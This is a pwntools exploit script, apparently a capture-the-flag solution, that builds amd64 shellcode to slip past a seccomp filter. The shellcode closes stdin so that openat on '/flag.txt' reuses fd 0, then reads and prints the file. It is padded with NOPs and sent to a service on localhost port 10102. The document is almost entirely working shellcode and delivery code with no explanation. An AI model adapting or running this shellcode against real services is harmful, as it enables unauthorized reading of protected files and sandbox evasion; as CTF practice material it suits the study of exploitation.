from pwn import *

context.arch = 'amd64'

offset = 100

_asm = '''
/* close(0) */
push rax
mov rax, 3
mov rdi, 0
syscall

/* openat(AT_FDCWD, '/flag.txt', 'O_RDONLY', 0) */
mov rax, 257
mov rdi, -100
pop rsi
add rsi, %d
push rsi
push rsi
xor rdx, rdx
xor rcx, rcx
syscall

/* read(0, flag_loc, 100) */
xor rdi, rdi
xor rax, rax
pop rsi 
mov dl, 100
syscall

/* write(1, flag_loc, 100) */
mov rax, 1
mov rdi, 1
pop rsi
mov dl, 100
syscall

/* exit(0) */
mov rax, 60
xor rdi, rdi
syscall
''' % (offset)
sc = asm(_asm)
sc = sc.ljust(100,'\x90')+'/flag.txt\x00'
# p = process(["./seccomp"])
p=remote('localhost', 10102)
p.sendlineafter('max', sc)
p.interactive()
